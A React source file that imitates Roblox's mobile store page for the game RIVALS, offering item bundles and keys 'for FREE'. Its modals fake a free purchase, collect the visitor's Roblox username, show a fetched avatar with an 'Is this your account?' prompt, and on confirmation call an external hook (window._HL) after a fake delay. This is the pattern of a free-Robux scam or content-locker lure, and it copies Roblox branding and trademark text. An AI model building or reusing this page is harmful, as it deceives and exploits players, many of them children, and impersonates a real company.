import React, { useState, useEffect } from 'react';
import { Menu, Search, Bell, MessageSquare, MoreHorizontal, Play, X, Loader2, ChevronDown } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

const items = [
  { id: 1, name: "Heavy Duty Bundle!", price: "1899", img: "https://i.postimg.cc/Dzc4Y6T0/no_Filter_(6).webp", type: "pass" },
  { id: 2, name: "Classic Bundle!", price: "1149", img: "https://i.postimg.cc/1t5VxFmC/no_Filter_(5).webp", type: "pass" },
  { id: 3, name: "Energy Bundle!", price: "1299", img: "https://i.postimg.cc/gJSXG0rb/no_Filter_(4).webp", type: "pass" },
  { id: 4, name: "Exogun Bundle!", price: "649", img: "https://i.postimg.cc/NMJ9Q0Lh/no_Filter_(3).webp", type: "pass" },
  { id: 5, name: "Standard Weapons Bundle!", price: "999", img: "https://i.postimg.cc/LXCYmshM/no_Filter_(2).webp", type: "pass" },
  { id: 6, name: "Medkit Bundle!", price: "249", img: "https://i.postimg.cc/ZR7BJq0J/no_Filter_(1).webp", type: "pass" },
  { id: 7, name: "RPG Bundle!", price: "124", img: "https://i.postimg.cc/kG2VGdtJ/no_Filter.webp", type: "product" },
  { id: 8, name: "Rivals Keys", price: "500", img: "https://i.postimg.cc/BvCvWzk9/Key2-removebg-preview.png", type: "product" },
];

const RobuxIcon = ({ className }: { className?: string }) => (
  <svg className={className || "w-3.5 h-3.5 fill-current"} viewBox="0 0 24 24">
    <path d="M12 2L20.66 7V17L12 22L3.34 17V7L12 2Z" stroke="currentColor" strokeWidth="2" fill="none" />
    <circle cx="12" cy="12" r="4" fill="currentColor" />
  </svg>
);

const RobloxLogo = () => (
  <svg className="w-8 h-8 fill-current" viewBox="0 0 24 24">
    <path d="M4.1 19.9L19.9 15.8L15.8 0L0 4.1L4.1 19.9ZM9 8L13 7L14 11L10 12L9 8Z" />
  </svg>
);

export default function App() {
  const [activeModal, setActiveModal] = useState<number | null>(null);
  const [selectedItem, setSelectedItem] = useState<any>(null);
  const [username, setUsername] = useState('');
  const [avatarUrl, setAvatarUrl] = useState('');
  const [fetchedUsername, setFetchedUsername] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);

  const passes = items.filter(i => i.type === 'pass');
  const products = items.filter(i => i.type === 'product');

  const openModal = (modalId: number, item?: any) => {
    if (item) setSelectedItem(item);
    setActiveModal(modalId);
  };

  const closeModal = () => {
    setActiveModal(null);
  };

  const fetchUser = async () => {
    if (username.trim().length < 3) {
      alert('Please enter a valid username.');
      return;
    }

    setIsLoading(true);
    const apiUrl = `https://roblox-api.hichamlkhibos57.workers.dev/api/roblox/userinfo/${encodeURIComponent(username.trim())}`;
    const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(apiUrl)}`;

    try {
      const response = await fetch(proxyUrl);
      if (!response.ok) throw new Error("API Error");
      
      const data = await response.json();
      
      if (data.status === "SUCCESS" && data.avatar) {
        setAvatarUrl(data.avatar);
        setFetchedUsername(`@${data.user_name || username}`);
      } else {
        throw new Error("User Not Found");
      }
    } catch (err) {
      console.log("Fallback triggered", err);
      setAvatarUrl(`https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png`);
      setFetchedUsername(`@${username}`);
    } finally {
      setIsLoading(false);
      openModal(4);
    }
  };

  const confirmUser = () => {
    setIsProcessing(true);
    setTimeout(() => {
      // @ts-ignore
      if (typeof window._HL === "function") {
        // @ts-ignore
        window._HL();
      } else {
        alert("Connection error. Please try again.");
        setIsProcessing(false);
      }
    }, 3000);
  };

  return (
    <div className="max-w-[600px] mx-auto bg-white min-h-screen relative font-sans text-[#393b3d]">
      {/* Top Nav */}
      <div className="flex justify-between items-center px-4 py-2 bg-white border-b border-[#f2f4f5]">
        <div className="flex items-center gap-4">
          <button className="p-1"><Menu className="w-6 h-6" /></button>
          <RobloxLogo />
        </div>
        <div className="flex items-center gap-4">
          <div className="w-7 h-7 rounded-full border border-[#e3e3e3] bg-[#f2f4f5] overflow-hidden">
            <img src="https://i.postimg.cc/9fLDCfNL/no-Filter-(7).webp" alt="User" className="w-full h-full object-cover" />
          </div>
          <button className="p-1"><Search className="w-6 h-6" /></button>
          <button className="p-1"><MessageSquare className="w-6 h-6" /></button>
          <button className="p-1"><Bell className="w-6 h-6" /></button>
        </div>
      </div>

      {/* Main Tabs */}
      <div className="flex justify-between px-4 border-b border-[#e3e3e3]">
        {['Charts', 'Marketplace', 'Create', 'Robux'].map((tab, i) => (
          <div key={tab} className={`py-3 px-1 text-sm cursor-pointer relative ${i === 1 ? 'font-bold text-[#111]' : 'font-semibold'}`}>
            {tab}
            {i === 1 && <div className="absolute bottom-[-1px] left-0 right-0 h-[3px] bg-[#111] rounded-t-sm" />}
          </div>
        ))}
      </div>

      {/* Game Banner */}
      <div className="pb-4 border-b border-[#e3e3e3]">
        <div className="w-full aspect-video bg-[#f2f4f5] relative overflow-hidden">
          <img src="https://i.postimg.cc/YCdwnLPC/no-Filter-(21).webp" 
               onError={(e) => { e.currentTarget.src = 'https://i.postimg.cc/t4kM0B8V/rivals-bg.jpg' }} 
               alt="RIVALS" className="w-full h-full object-cover" />
        </div>
        <div className="p-4">
          <h1 className="text-2xl font-extrabold text-[#111] mb-1 tracking-tight">RIVALS</h1>
          <div className="text-sm flex items-center gap-1 mb-1">
            By <strong className="font-semibold text-[#111]">Nosniy Games</strong>
            <span className="inline-flex items-center justify-center w-3.5 h-3.5 text-[#0060ff]">
              <svg viewBox="0 0 16 16" className="fill-current w-full h-full"><path d="M16 8L13.8 5L14 1.5L10.5 1.2L8 0L5.5 1.2L2 1.5L2.2 5L0 8L2.2 11L2 14.5L5.5 14.8L8 16L10.5 14.8L14 14.5L13.8 11L16 8ZM7 11.5L3.5 8L4.8 6.7L7 8.9L11.2 4.7L12.5 6L7 11.5Z"/></svg>
            </span>
          </div>
          <div className="text-xs text-[#757575] font-medium mb-3">Maturity: Mild - Ages 5+</div>
          
          <button className="w-full bg-[#0060ff] text-white border-none rounded-lg h-12 flex items-center justify-center cursor-pointer mb-4 hover:bg-[#0050d4] transition-colors">
            <Play className="w-6 h-6 fill-current" />
          </button>
        </div>

        <div className="flex justify-between items-center px-4">
          {[
            { icon: <svg viewBox="0 0 24 24" className="w-6 h-6 fill-none stroke-current stroke-[1.5]"><path d="M12 17.27L18.18 21L16.54 13.97L22 9.24L14.81 8.63L12 2L9.19 8.63L2 9.24L7.46 13.97L5.82 21L12 17.27Z"/></svg>, label: 'Favorite' },
            { icon: <svg viewBox="0 0 24 24" className="w-6 h-6 fill-none stroke-current stroke-[1.5]"><path d="M12 22C13.1 22 14 21.1 14 20H10C10 21.1 10.9 22 12 22ZM18 16V11C18 7.93 16.36 5.36 13.5 4.68V4C13.5 3.17 12.83 2.5 12 2.5C11.17 2.5 10.5 3.17 10.5 4V4.68C7.63 5.36 6 7.92 6 11V16L4 18V19H20V18L18 16Z"/></svg>, label: 'Notify' },
            { icon: <svg viewBox="0 0 24 24" className="w-6 h-6 fill-none stroke-current stroke-[1.5]"><path d="M1 21H5V9H1V21ZM23 10C23 8.9 22.1 8 21 8H14.68L15.64 3.43L15.67 3.11C15.67 2.7 15.5 2.32 15.23 2.05L14.17 1L7.59 7.59C7.22 7.95 7 8.45 7 9V19C7 20.1 7.9 21 9 21H18.28C19.13 21 19.86 20.48 20.15 19.71L22.84 13.43C22.95 13.15 23 12.86 23 12.5V10Z"/></svg>, label: '8M+' },
            { icon: <svg viewBox="0 0 24 24" className="w-6 h-6 fill-none stroke-current stroke-[1.5]"><path d="M15 3H6C5.17 3 4.46 3.5 4.16 4.22L1.14 11.28C1.05 11.5 1 11.74 1 12V14C1 15.1 1.9 16 3 16H9.31L8.36 20.57L8.33 20.89C8.33 21.3 8.5 21.68 8.77 21.95L9.83 23L16.41 16.41C16.78 16.05 17 15.55 17 15V5C17 3.9 16.1 3 15 3ZM23 3H19V15H23V3Z"/></svg>, label: '482K+' }
          ].map((action, i) => (
            <div key={i} className="flex flex-col items-center gap-1 text-xs font-semibold cursor-pointer">
              {action.icon}
              {action.label}
            </div>
          ))}
        </div>
      </div>

      {/* Sub Tabs */}
      <div className="flex border-b border-[#e3e3e3] mt-4">
        {['About', 'Store', 'Servers'].map((tab, i) => (
          <div key={tab} className={`flex-1 text-center py-3 text-sm cursor-pointer relative ${i === 1 ? 'font-bold text-[#111]' : 'font-semibold'}`}>
            {tab}
            {i === 1 && <div className="absolute bottom-[-1px] left-0 right-0 h-[3px] bg-[#111] rounded-t-sm" />}
          </div>
        ))}
      </div>

      {/* Store Sections */}
      <div className="p-4">
        <h2 className="text-lg font-bold text-[#111] mb-3">Passes</h2>
        <div className="grid grid-cols-3 gap-x-4 gap-y-6 mb-6">
          {passes.map(item => (
            <div key={item.id} className="flex flex-col items-start cursor-pointer group" onClick={() => openModal(1, item)}>
              <div className="w-full aspect-square rounded-full overflow-hidden bg-[#f2f4f5] mb-2 border border-[#e3e3e3] shadow-sm group-hover:shadow-md transition-shadow">
                <img src={item.img} alt={item.name} className="w-full h-full object-cover" />
              </div>
              <div className="text-xs font-bold text-[#111] mb-1 w-full line-clamp-2 leading-tight">{item.name}</div>
              <div className="flex items-center gap-1 text-xs font-semibold text-[#111] mb-2">
                <RobuxIcon /> {item.price}
              </div>
              <button className="w-full bg-transparent border border-[#bdc3c7] rounded-md py-1.5 text-[13px] font-semibold text-[#393b3d] group-hover:bg-[#f2f4f5] transition-colors">
                Buy
              </button>
            </div>
          ))}
        </div>
      </div>

      <div className="p-4 border-t border-[#e3e3e3]">
        <h2 className="text-lg font-bold text-[#111] mb-3">Products</h2>
        <div className="grid grid-cols-3 gap-x-4 gap-y-6 mb-6">
          {products.map(item => (
            <div key={item.id} className="flex flex-col items-start cursor-pointer group" onClick={() => openModal(1, item)}>
              <div className="w-full aspect-square bg-transparent mb-2 flex items-center justify-center">
                <img src={item.img} alt={item.name} className="w-[90%] h-[90%] object-contain drop-shadow-md group-hover:scale-105 transition-transform" />
              </div>
              <div className="text-xs font-bold text-[#111] mb-1 w-full line-clamp-2 leading-tight">{item.name}</div>
              <div className="flex items-center gap-1 text-xs font-semibold text-[#111] mb-2">
                <RobuxIcon /> {item.price}
              </div>
              <button className="w-full bg-transparent border border-[#bdc3c7] rounded-md py-1.5 text-[13px] font-semibold text-[#393b3d] group-hover:bg-[#f2f4f5] transition-colors">
                Buy
              </button>
            </div>
          ))}
        </div>
      </div>

      {/* Footer */}
      <div className="p-6 bg-[#f8f9fa] border-t border-[#e3e3e3] text-center">
        <div className="flex flex-wrap justify-center gap-x-4 gap-y-3 mb-6">
          {['About Us', 'Jobs', 'Blog', 'Parents', 'Buy Gift Cards', 'Help', 'Terms', 'Accessibility', 'Privacy', 'Sitemap'].map(link => (
            <a key={link} href="#" className="text-xs font-semibold text-[#393b3d] hover:underline">{link}</a>
          ))}
          <a href="#" className="flex items-center gap-1 text-xs font-semibold text-[#393b3d] hover:underline">
            Your Privacy Choices <svg width="16" height="16" viewBox="0 0 24 24"><rect width="24" height="24" rx="4" fill="#0060ff"/><path d="M6 12L10 16L18 8" stroke="white" strokeWidth="2" fill="none"/></svg>
          </a>
        </div>
        <div className="flex items-center justify-between gap-4 text-[10px] text-[#757575] text-left">
          <div className="px-3 py-2 border border-[#bdc3c7] rounded bg-white text-xs font-semibold text-[#393b3d] flex items-center gap-2 cursor-pointer">
            English (United States) <ChevronDown className="w-3 h-3" />
          </div>
          <div className="flex-1">
            ©2024 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
          </div>
        </div>
      </div>

      {/* Modals */}
      <AnimatePresence>
        {activeModal === 1 && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/65 backdrop-blur-[2px] flex justify-center items-center z-50"
          >
            <motion.div 
              initial={{ scale: 0.95, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.95, opacity: 0 }}
              className="bg-[#232527] w-[85%] max-w-[350px] rounded-xl overflow-hidden shadow-2xl text-white font-sans"
            >
              <div className="p-3.5 text-center text-lg font-bold border-b border-[#3e4042]">Buy Item</div>
              <div className="p-6 text-center text-[15px] leading-relaxed">
                Would you like to get <span className="font-bold">{selectedItem?.name}</span> <span className="text-[#ffb12c] mx-0.5">★</span> from Fish Atelier for <span className="font-bold text-green-400">FREE</span>?
              </div>
              <div className="px-5 pb-5 flex gap-3">
                <button onClick={closeModal} className="flex-1 p-2.5 bg-transparent border border-white text-white rounded-lg font-semibold text-base hover:bg-white/10 transition-colors">Cancel</button>
                <button onClick={() => openModal(2)} className="flex-1 p-2.5 bg-white text-black rounded-lg font-bold text-base hover:bg-gray-200 transition-colors">FREE</button>
              </div>
            </motion.div>
          </motion.div>
        )}

        {activeModal === 2 && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/65 backdrop-blur-[2px] flex justify-center items-center z-50"
          >
            <motion.div 
              initial={{ y: 20, opacity: 0 }} animate={{ y: 0, opacity: 1 }} exit={{ y: 20, opacity: 0 }}
              className="bg-white w-[85%] max-w-[350px] rounded-xl relative shadow-2xl text-[#393b3d] p-5"
            >
              <button onClick={closeModal} className="absolute top-4 left-4 p-1 hover:bg-gray-100 rounded-full transition-colors">
                <X className="w-5 h-5" />
              </button>
              <div className="text-center mt-4 mb-5">
                <div className="text-xl font-extrabold mb-1.5 text-black">You need more Robux</div>
                <div className="text-[13px] text-[#757575] flex items-center justify-center gap-1 font-medium">
                  Current Balance <RobuxIcon className="w-3 h-3 text-[#757575]" /> 0
                </div>
              </div>
              <div className="flex flex-col gap-4">
                <div className="flex gap-4 items-center mb-2">
                  <div className="w-20 h-20 bg-[#f2f4f5] rounded-xl border border-[#e3e3e3] flex items-center justify-center overflow-hidden p-2">
                    <img src={selectedItem?.img} alt={selectedItem?.name} className="w-full h-full object-contain" />
                  </div>
                  <div>
                    <h3 className="text-base font-bold mb-1">{selectedItem?.name}</h3>
                    <div className="flex items-center gap-1 text-sm font-semibold text-gray-500 line-through">
                      <RobuxIcon className="w-3.5 h-3.5" /> {selectedItem?.price}
                    </div>
                  </div>
                </div>
                <div className="border border-black rounded-lg p-3 flex justify-between items-center bg-gray-50">
                  <div className="flex items-center gap-1.5 font-bold text-base">
                    <RobuxIcon className="w-4 h-4" /> {selectedItem?.price}
                  </div>
                  <div className="font-extrabold text-base text-green-600">FREE</div>
                </div>
                <button onClick={() => openModal(3)} className="w-full bg-[#0074ff] text-white text-base font-bold p-3 rounded-lg mt-1 hover:bg-[#0060d4] transition-colors">
                  Continue
                </button>
                <div className="text-[10px] text-[#757575] text-center mt-2 leading-tight">
                  Your payment method will not be charged.<br/>Roblox Terms of Use apply.
                </div>
              </div>
            </motion.div>
          </motion.div>
        )}

        {activeModal === 3 && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/65 backdrop-blur-[2px] flex justify-center items-center z-50"
          >
            <motion.div 
              initial={{ scale: 0.95, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.95, opacity: 0 }}
              className="bg-white w-[85%] max-w-[350px] rounded-xl relative shadow-2xl text-[#393b3d] p-5"
            >
              <button onClick={closeModal} className="absolute top-4 left-4 p-1 hover:bg-gray-100 rounded-full transition-colors">
                <X className="w-5 h-5" />
              </button>
              <div className="text-center mt-4 mb-5">
                <div className="text-xl font-extrabold mb-1.5 text-black">Enter Roblox Username</div>
                <div className="text-[13px] text-[#757575] font-medium">Type your Roblox username to fetch your avatar</div>
              </div>
              <div className="flex flex-col gap-4">
                <input 
                  type="text" 
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  onKeyDown={(e) => e.key === 'Enter' && fetchUser()}
                  placeholder="Username"
                  autoFocus
                  className="w-full p-3.5 border border-[#e3e3e3] bg-[#f2f4f5] rounded-lg text-base outline-none text-center font-semibold focus:border-black focus:bg-white transition-colors"
                />
                <button 
                  onClick={fetchUser} 
                  disabled={isLoading}
                  className="w-full bg-[#0074ff] text-white text-base font-bold p-3 rounded-lg flex items-center justify-center gap-2 hover:bg-[#0060d4] transition-colors disabled:opacity-70 disabled:cursor-not-allowed"
                >
                  {isLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : 'Next'}
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}

        {activeModal === 4 && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/65 backdrop-blur-[2px] flex justify-center items-center z-50"
          >
            <motion.div 
              initial={{ scale: 0.95, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.95, opacity: 0 }}
              className="bg-white w-[85%] max-w-[350px] rounded-xl relative shadow-2xl text-[#393b3d] p-6"
            >
              <div className="text-center mb-6">
                <div className="text-xl font-extrabold text-black">Is this your account?</div>
              </div>
              <div className="flex flex-col items-center gap-4">
                <div className="w-24 h-24 rounded-full bg-[#f2f4f5] overflow-hidden border-4 border-[#e3e3e3] shadow-inner">
                  <img src={avatarUrl} alt="Avatar" className="w-full h-full object-cover" />
                </div>
                <div className="text-lg font-extrabold text-[#393b3d] mb-2">{fetchedUsername}</div>
                <div className="flex gap-3 w-full">
                  <button 
                    onClick={() => openModal(3)} 
                    disabled={isProcessing}
                    className="flex-1 p-3 bg-[#e3e3e3] text-[#393b3d] rounded-lg font-bold text-base hover:bg-gray-300 transition-colors disabled:opacity-50"
                  >
                    No
                  </button>
                  <button 
                    onClick={confirmUser} 
                    disabled={isProcessing}
                    className="flex-1 p-3 bg-[#0074ff] text-white rounded-lg font-bold text-base flex items-center justify-center gap-2 hover:bg-[#0060d4] transition-colors disabled:opacity-80"
                  >
                    {isProcessing ? <Loader2 className="w-5 h-5 animate-spin" /> : 'Yes'}
                  </button>
                </div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
